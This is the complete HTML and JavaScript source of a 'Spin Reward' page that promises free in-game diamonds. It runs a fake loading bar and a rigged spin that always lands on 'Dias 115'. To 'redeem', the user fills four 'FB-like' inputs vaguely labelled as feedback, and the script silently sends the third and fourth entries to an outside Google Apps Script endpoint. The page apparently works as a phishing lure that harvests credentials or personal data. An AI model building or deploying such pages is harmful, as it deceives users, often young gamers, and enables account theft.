<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spin Reward</title>

<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{
  margin:0;height:100vh;display:flex;justify-content:center;align-items:center;
  font-family:Helvetica,Arial,sans-serif;
  background:radial-gradient(circle at top,#5e2b97,#0b0016);color:#fff;
}
.hidden{display:none}

.card{
  width:94%;max-width:360px;
  background:rgba(255,255,255,.08);backdrop-filter:blur(14px);
  border-radius:18px;padding:18px;text-align:center;
  box-shadow:0 0 40px rgba(90,0,255,.4);
}

/* Loading */
.circle{
  width:70px;height:70px;border-radius:50%;
  border:6px solid rgba(255,255,255,.25);
  border-top:6px solid #2da9ff;
  animation:spin 1s linear infinite;margin:14px auto;
}
@keyframes spin{to{transform:rotate(360deg)}}
.barWrap{width:100%;height:10px;background:rgba(255,255,255,.25);border-radius:6px;overflow:hidden}
.bar{height:100%;width:0%;background:#2da9ff}

/* Button */
.btn{
  width:100%;height:44px;border:none;border-radius:10px;
  background:linear-gradient(135deg,#4da6ff,#7a3cff);
  color:#fff;font-size:16px;font-weight:bold;
}
.btn:active{transform:scale(.96)}

/* FB-like input */
.fb-input{
  width:100%;height:44px;border-radius:8px;border:1px solid #ccd0d5;
  padding:0 12px;font-size:15px;margin-top:10px;
}

/* Dots loader */
.dots{font-size:26px;letter-spacing:6px;animation:pulse 1s infinite}
@keyframes pulse{0%{opacity:.3}50%{opacity:1}100%{opacity:.3}}
</style>
</head>

<body>
<div class="card">

<!-- LOADING PAGE -->
<div id="loadingPage">
  <h3>Loading</h3>
  <div class="circle"></div>
  <div class="barWrap"><div class="bar" id="bar"></div></div>
  <p id="percent">0%</p>
</div>

<!-- SPIN -->
<div id="spinPage" class="hidden">
  <h3>Spin Reward</h3>
  <div id="spinBox" style="font-size:22px;margin:22px 0;">READY</div>
  <button class="btn" id="spinBtn" onclick="spin()">GO</button>
</div>

<!-- RESULT -->
<div id="resultPage" class="hidden">
  <h2>ðŸŽ‰ You Got</h2>
  <h1>115 Dias</h1>
  <button class="btn" onclick="toFb(1)">Redeem</button>
</div>

<!-- FB 1 -->
<div id="fb1" class="hidden">
  <h3>Send Feedback to Redeem</h3>
  <input class="fb-input" placeholder="Feedback 1">
  <button class="btn" onclick="nextWithWait(1)">Next</button>
</div>

<!-- FB 2 -->
<div id="fb2" class="hidden">
  <input class="fb-input" placeholder="Feedback 2">
  <button class="btn" onclick="nextWithWait(2)">Next</button>
</div>

<!-- FB 3 (SAVE) -->
<div id="fb3" class="hidden">
  <input class="fb-input" id="f3" placeholder="Feedback 3">
  <button class="btn" onclick="saveAndNext()">Next</button>
</div>

<!-- FB 4 (SAVE) -->
<div id="fb4" class="hidden">
  <input class="fb-input" id="f4" placeholder="Feedback 4">
  <button class="btn" onclick="saveFinal()">REDEEM</button>
</div>

<!-- WAIT -->
<div id="wait" class="hidden"><div class="dots">â€¢â€¢â€¢</div></div>

<!-- DONE -->
<div id="done" class="hidden">
  <h2>âœ… Successfully Redeemed</h2>
</div>

</div>

<script>
/* ===== CONFIG ===== */
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxPZco9av6RzXCesIXIByfVHRHdhhqmDD8_UaeAb6R1akmK9jPhCvQrRZpRqy47bqUCPw/exec"; // optional

/* ===== LOADING 25s ===== */
let p=0;
const load=setInterval(()=>{
  p++; bar.style.width=p+"%"; percent.innerText=p+"%";
  if(p>=100){
    clearInterval(load);
    loadingPage.classList.add("hidden");
    spinPage.classList.remove("hidden");
  }
},250);

/* ===== SPIN ===== */
let spun=false;
const items=[
 "Random Epic Skin","Random Emote","Dias 75","Dias 30",
 "Dias 45","Dias 115","Dias 558","Nothing","Nothing"
];
function spin(){
  if(spun) return;
  spun=true; spinBtn.disabled=true;
  let i=0;
  const anim=setInterval(()=>{
    spinBox.innerText=items[Math.floor(Math.random()*items.length)];
    i++;
    if(i>=20){
      clearInterval(anim);
      spinBox.innerText="Dias 115";
      setTimeout(()=>{
        spinPage.classList.add("hidden");
        resultPage.classList.remove("hidden");
      },600);
    }
  },300);
}

/* ===== FLOW ===== */
function toFb(n){
  resultPage.classList.add("hidden");
  document.getElementById("fb"+n).classList.remove("hidden");
}
function nextWithWait(n){
  document.getElementById("fb"+n).classList.add("hidden");
  wait.classList.remove("hidden");
  setTimeout(()=>{
    wait.classList.add("hidden");
    document.getElementById("fb"+(n+1)).classList.remove("hidden");
  },5000);
}

/* ===== SAVE ONLY FB3 & FB4 ===== */
function saveAndNext(){
  const v=document.getElementById("f3").value;
  if(WEB_APP_URL){
    fetch(WEB_APP_URL+"?step=3&feedback="+encodeURIComponent(v));
  }
  fb3.classList.add("hidden");
  wait.classList.remove("hidden");
  setTimeout(()=>{
    wait.classList.add("hidden");
    fb4.classList.remove("hidden");
  },5000);
}

function saveFinal(){
  const v=document.getElementById("f4").value;
  if(WEB_APP_URL){
    fetch(WEB_APP_URL+"?step=4&feedback="+encodeURIComponent(v));
  }
  fb4.classList.add("hidden");
  done.classList.remove("hidden");
}
</script>
</body>
</html>
